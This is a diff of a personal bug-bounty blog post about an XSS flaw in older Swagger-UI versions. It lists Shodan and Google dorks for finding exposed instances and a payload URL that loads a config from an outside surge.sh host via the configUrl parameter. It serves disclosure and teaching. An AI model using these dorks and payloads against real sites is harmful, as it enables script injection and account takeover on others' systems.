@@ -1,5 +1,5 @@
 ---
-title: "Unveiling Cross-Site Scripting in Swagger-ui"
+title: "My first Valid bug :Unveiling Cross-Site Scripting in Swagger-ui"
 date: 2023-10-30
 draft: false
 series: "Bug Hunting"
@@ -21,9 +21,11 @@ so, lets go on and start with a short intro about the vulnerablity!
 Swagger-UI, a popular tool for designing, building, and documenting APIs, provides a user-friendly interface for developers to explore and interact with API endpoints. However, like any web application, Swagger-UI is not immune to security vulnerabilities.
 and The root cause is that Swagger-UI allows users to provide a URL for an API specification, such as a YAML or JSON file in outdated version of DomPurify, an XML sanitizer library for HTML, MathML, and SVG. . To view and render them, you add a query parameter. It would be possible to trigger an XSS attack by loading a malicious!!
 
-### The Story Unfolds: The Journey Begins!!
+- for more about this vuln, please check the References !
 
-so During my exploration of the Swagger-ui application, that I found via shodan by using specific Dorks! Here are a few dorks that you can use to search in Shodan for Swagger-UI:
+### The Story Unfolds: The Journey Begins :sparkles: !!
+
+so During my :mag_right: of the Swagger-ui application, that I found via shodan by using specific Dorks! Here are a few dorks that you can use to search in Shodan for Swagger-UI:
 
 ```
 "Swagger-UI"
@@ -44,7 +46,7 @@ intext:"Powered by Swagger UI"
 site:github.com inurl:swagger-ui
 ```
 
-so ! I stumbled upon a potential XSS vulnerability. By appending a specific parameter to the Swagger UI URL, I was able to inject and execute arbitrary JavaScript code. The steps to reproduce the bug were as follows:
+so ! I stumbled upon a potential XSS vulnerability. By appending a specific payloads to the Swagger UI URL, I was able to inject and execute arbitrary JavaScript code. The steps to reproduce the bug were as follows:
 
 - Visit the Swagger UI URL:
 
@@ -52,7 +54,7 @@ so ! I stumbled upon a potential XSS vulnerability. By appending a specific para
  https://127.0.0.1/swagger/index.html.
 ```
 
-- Append the following to the URL:
+- Append the following payload to the URL _ I used this payload as shown below _:
 
 ```
 ?configUrl=https://tearful-earth.surge.sh/test.json.
@@ -64,7 +66,7 @@ so ! I stumbled upon a potential XSS vulnerability. By appending a specific para
  https://127.0.0.1/swagger/index.html?configUrl=https://tearful-earth.surge.sh/test.json.
 ```
 
-![image tooltip here](../../static/images/dhey.PNG)
+![image tooltip here](https://github.com/khawla-abdulsattar/poison/blob/main/static/images/dhey.PNG?raw=true)
 
 ## Impact of Cross-Site Scripting:
 
@@ -80,11 +82,12 @@ Cross-site scripting attacks can have severe consequences and enable attackers t
 
 ---
 
-As I conclude this article, I hope that my journey of uncovering an XSS bug has ignited a spark within you. Whether you're a security professional or just starting your exploration of the web security realm, remember that every bug, no matter how small or seemingly insignificant, has the potential to make a significant impact.
+As I conclude this article, I hope that my journey of uncovering an XSS bug has ignited a spark within you :sparkler: .
+Whether you're a security professional or just starting your exploration of the web security realm, remember that every bug, no matter how small or seemingly insignificant, has the potential to make a significant impact.
 
 ###### thanks fot reading :)
 
-## Refernce :
+## References :
 
 - https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
 - https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks
